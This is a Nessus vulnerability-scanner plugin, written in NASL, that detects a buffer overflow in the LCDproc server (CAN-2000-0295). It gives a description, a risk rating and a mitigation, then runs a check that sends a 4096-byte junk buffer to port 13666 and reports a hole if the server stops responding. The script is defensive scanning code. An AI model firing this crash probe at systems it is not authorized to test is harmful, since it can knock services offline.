#
# This script was written by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10378);
 script_version ("$Revision: 1.8 $");
 script_bugtraq_id(1131);
 script_cve_id("CAN-2000-0295");
 name["english"] = "LCDproc buffer overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "LCDproc (http://lcdproc.omnipotent.net) is a 
system that is used to display system information and other data 
on an LCD display (or any supported display device, including 
curses or text)
The LCDproc version 4.0 and above uses a client-server protocol, allowing 
anyone with access to the LCDproc server to modify the displayed content.
It is possible to cause the LCDproc server to crash and execute arbitrary 
code by sending the server a large buffer that will overflow its internal 
buffer.

For more information see article:
http://www.securiteam.com/exploits/Remote_vulnerability_in_LCDproc_0_4__shell_access_.html
(NOTE: URL maybe wrapped)

Risk factor : High
Solution: Disable access to this service from outside by disabling access 
 to TCP port 13666 (default port used)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Check whether LCDproc is vulnerable to attack";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2000 SecuriTeam");
 family["english"] = "Misc.";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
  script_require_ports("Services/lcdproc", 13666);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/lcdproc");
if(!port)port = 13666;

if(get_port_state(port))
{
  req = crap(4096);
  soc = open_sock_tcp(port);
  if(soc)
  {
   send(socket:soc, data:req);
   result = recv(socket:soc, length:4096);
   if(strlen(result) == 0)
   {
    security_hole(port:port);
    exit(0);
   }
  }
}

